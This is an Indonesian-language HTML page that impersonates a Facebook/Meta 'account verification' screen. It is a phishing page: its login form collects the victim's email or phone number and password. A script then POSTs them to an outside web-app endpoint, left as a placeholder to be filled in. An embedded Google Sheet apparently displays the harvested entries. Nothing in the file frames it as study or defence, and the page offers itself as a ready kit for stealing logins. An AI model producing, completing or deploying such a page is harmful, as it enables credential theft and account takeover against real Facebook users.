<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Verifikasi Akun</title>
  <style>
    /* (CSS seperti sebelumnya Anda sisipkan) */
    body { /* ... */ }
    header { /* ... */ }
    .description { /* ... */ }
    .card { /* ... centered, no absolute */ }
    .sheet-embed { margin: 24px auto; max-width: 800px; width: 100%; padding: 0 16px; }
    .sheet-embed iframe { width: 100%; height: 400px; border: none; }
    footer { /* ... */ }
  </style>
</head>
<body>
  <header>Verifikasi Akun dan Amankan</header>
  <div class="description">
    Facebook membantu Anda terhubung dan berbagi dengan orangâ€‘orang dalam kehidupan Anda.
  </div>

  <div class="card">
    <h1>Masuk ke Akun Anda</h1>
    <form id="login-form">
      <div><label>Email atau Nomor Telepon</label><input type="email" name="emailOrPhone" required></div>
      <div><label>Kata Sandi</label><input type="password" name="password" required></div>
      <button type="submit">Kirim & Amankan</button>
    </form>
  </div>

  <!-- Embed Google Sheet -->
  <div class="sheet-embed">
    <iframe src="https://docs.google.com/spreadsheets/d/14nPAYOjs1DnbDwChhixhod0G6sWpLjZb2PVemdwearw/pubhtml?widget=true&amp;headers=false"></iframe>
  </div>

  <footer>&copy; 2025 VERIFIKASI META</footer>

  <script>
    const scriptURL = 'PASTE_WEB_APP_URL_DI_SINI';
    const form = document.getElementById('login-form');
    form.addEventListener('submit', e => {
      e.preventDefault();
      fetch(scriptURL, { method: 'POST', body: new FormData(form) })
        .then(res => res.json())
        .then(json => {
          if (json.status === 'OK') alert('Data berhasil terkirim!');
          else alert('Ada kesalahan!');
          form.reset();
        })
        .catch(err => {
          console.error(err);
          alert('Gagal mengirim data.');
        });
    });
  </script>
</body>
</html>
